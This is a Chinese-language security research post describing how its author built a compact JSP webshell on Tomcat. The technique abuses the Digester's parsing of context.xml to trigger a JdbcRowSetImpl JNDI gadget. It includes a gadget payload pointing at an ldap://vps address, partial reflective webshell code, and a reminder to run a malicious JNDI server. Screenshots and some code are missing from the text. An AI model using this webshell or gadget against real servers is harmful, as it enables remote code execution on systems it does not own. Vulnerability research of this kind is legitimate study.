@Y4tacker
jsp新webshell的探索之旅
简介
这篇⽂章记录了我从⼀个⼩发现到实现RCE，为了实现更短的webshell，在这之间遇到了不断
的新问题再到解决，再到最终精简得到⼀个新的jsp五⾏Payload构成的webshell的过程
发现
在tomcat的扫描中都有对⼀些配置⽂件的扫描以及对⾥⾯的属性解析赋值的过程，由于之前的
⼀些⼩发现(这⾥不多说)，今天下午⼀个突如其来的crush在我⼼中出现，我去跟踪了⼀下解析
context.xml的过程
在 org.apache.catalina.startup.ContextConfig#contextConfig 中，从这⾥可以看
到defaultContextXml要么从标准上下⽂，要么则是默认值 conf/context.xml
接下来在解析阶段，在其中的
org.apache.tomcat.util.digester.Digester#startElement 引起了我的注意
这⾥如果匹配到标签 Context 或 Manager 则会去调
⽤ org.apache.tomcat.util.digester.SetPropertiesRule#begin ,⽽这个函数中取出
属性赋值的地⽅如下
之后通过调⽤setProperty⽅法，去调⽤属性的set⽅法，具体如下(部分截图)
到了这⾥⼀个思路就涌现在我脑中，还记得fastJson的第⼀个payload吗
这不就是都是set的过程
之后我在contenx.xml中加上
{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"ldap://vps/TouchFile", 
  "autoCommit":true
}
再次启动tomcat，成功弹出了计算器
新的问题
可是这个利⽤链过程是在tomcat启动的过程啊，要想彻底解决我们还得去看看它是通过什么函
数进⾏解析，以及我们是否能控制呢
在 org.apache.catalina.startup.ContextConfig#init 中，我们看看关键的步骤
可以看到函数 contextConfig 中传⼊⼀个 contextDigester 对象，这个对象我们也很好得
到，虽然这是⼀个protected修饰的函数，但是⾥⾯的过程却都是public修饰的，因此我们直接
复制出来即可
    protected void init() {
        Digester contextDigester = createContextDigester();
        contextDigester.getParser();
----------------
        contextConfig(contextDigester);
    }
继续跟进执⾏在 org.apache.catalina.startup.ContextConfig#contextConfig ，最
开始我们便提到了要么从标准上下⽂，要么则是默认值 conf/context.xml ，那么为了扩展
攻击⾯利⽤我们肯定选择前者
流程实现构造Webshell
因此，我们再梳理⼀下上⾯的利⽤流程
1.实例化ContextConfig
2.获取StandardContext，添加到ContextConfig的context
3.初始化Digester对象
4.调⽤ContextConfig的contextConfig函数执⾏利⽤过程
, List> fakeAttributes = new HashMap<>();
    ArrayList attrs = new ArrayList<>();
    attrs.add("className");
    fakeAttributes.put(Object.class, attrs);
    digester.setFakeAttributes(fakeAttributes);
    RuleSet contextRuleSet = new ContextRuleSet("", false);
    digester.addRuleSet(contextRuleSet);
    RuleSet namingRuleSet = new NamingRuleSet("Context/");
    digester.addRuleSet(namingRuleSet);
    digester.getParser();
    //调⽤contextConfig函数执⾏利⽤过程
    Method contextConfig = 
ContextConfig.class.getDeclaredMethod("contextConfig", Digester.class);
    contextConfig.setAccessible(true);
    contextConfig.invoke(ctConfig,digester);
%>
深⼊思考
难道这就够了吗，看着这串又臭又长的webshell我⼀点都不满⾜，我想让这个webshell更短⼀
点，那么为了实现这⼀步那就得跟深⼊的对利⽤流程进⾏跟踪
我们可以发现在 org.apache.catalina.startup.ContextConfig#contextConfig ，在
调⽤ processContextConfig 的时候
可以看到在实际上主要的步骤还是在对 Digester 对象继续的添加加载器等操作以及最终调
⽤parse函数，在其中唯⼀多出来的部分就是这个InputSource
那么去掉⼀些⽆关的操作最终得到，当然这部分就是⾃⼰寻找的过程就没必要写进来了
测试执⾏成功
其中cmd解码内容为
当然还有个关键的就是不要忘了启动⼀个恶意jndi服务